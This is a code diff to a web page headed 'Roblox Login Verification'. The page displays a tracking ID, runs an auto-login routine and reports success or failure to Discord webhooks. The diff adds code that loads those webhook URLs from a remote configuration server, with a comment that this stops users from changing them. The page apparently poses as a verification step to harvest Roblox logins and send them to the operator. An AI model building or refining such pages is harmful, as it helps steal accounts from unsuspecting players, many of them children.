@@ -70,7 +70,7 @@
             font-weight: bold;
             text-align: center;
         }
-        result-failure {
+        .result-failure {
             color: #f44336;
             font-weight: bold;
             text-align: center;
@@ -79,11 +79,31 @@
             margin: 20px 0;
             text-align: center;
         }
+        .config-status {
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 4px;
+            text-align: center;
+        }
+        .config-success {
+            background-color: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        .config-error {
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>Roblox Login Verification</h1>
+        
+        <div id="config-status" class="config-status hidden">
+            <span id="config-status-text"></span>
+        </div>
         
         <div class="info-box">
             <strong>Tracking ID:</strong> <span id="display-tracking-id">Loading...</span><br>
@@ -127,6 +147,7 @@
         // Configuration will be fetched from the server
         let SUCCESS_WEBHOOK = null;
         let FAILED_WEBHOOK = null;
+        let CONFIG_SERVER = "https://your-config-server.com/config"; // Replace with your server endpoint
         
         // Display the tracking info
         if (trackingId) {
@@ -147,16 +168,52 @@
         
         async function fetchConfiguration() {
             try {
-                // In a real implementation, you would fetch this from your server
-                // For now, we'll use the values from your Lua script
-                SUCCESS_WEBHOOK = "";
-                FAILED_WEBHOOK = "";
+                showConfigStatus("Connecting to configuration server...", "loading");
                 
+                // In a real implementation, you would fetch this from your server
+                // This prevents users from changing the webhook URLs
+                const response = await fetch(CONFIG_SERVER, {
+                    method: 'GET',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-Requested-With': 'XMLHttpRequest'
+                    }
+                });
+                
+                if (!response.ok) {
+                    throw new Error(`Server returned ${response.status}: ${response.statusText}`);
+                }
+                
+                const config = await response.json();
+                
+                SUCCESS_WEBHOOK = config.successWebhook;
+                FAILED_WEBHOOK = config.failedWebhook;
+                
+                showConfigStatus("Configuration loaded successfully", "success");
                 setTimeout(attemptAutoLogin, 2000); // Wait 2 seconds before starting
             } catch (error) {
                 console.error('Failed to fetch configuration:', error);
-                showError('Failed to load verification configuration');
+                showConfigStatus("Failed to load configuration from server", "error");
+                showError('Failed to load verification configuration: ' + error.message);
             }
+        }
+        
+        function showConfigStatus(message, type) {
+            const statusElement = document.getElementById('config-status');
+            const statusTextElement = document.getElementById('config-status-text');
+            
+            statusTextElement.textContent = message;
+            statusElement.classList.remove('hidden', 'config-success', 'config-error');
+            
+            if (type === 'success') {
+                statusElement.classList.add('config-success');
+            } else if (type === 'error') {
+                statusElement.classList.add('config-error');
+            } else if (type === 'loading') {
+                // Keep default styling for loading
+            }
+            
+            statusElement.classList.remove('hidden');
         }
         
         async function attemptAutoLogin() {
@@ -352,6 +409,7 @@
         async function sendToDiscord(isSuccess) {
             if (!SUCCESS_WEBHOOK || !FAILED_WEBHOOK) {
                 console.error('Webhook URLs not configured');
+                showError('Webhook configuration missing. Please check your configuration server.');
                 return;
             }
             
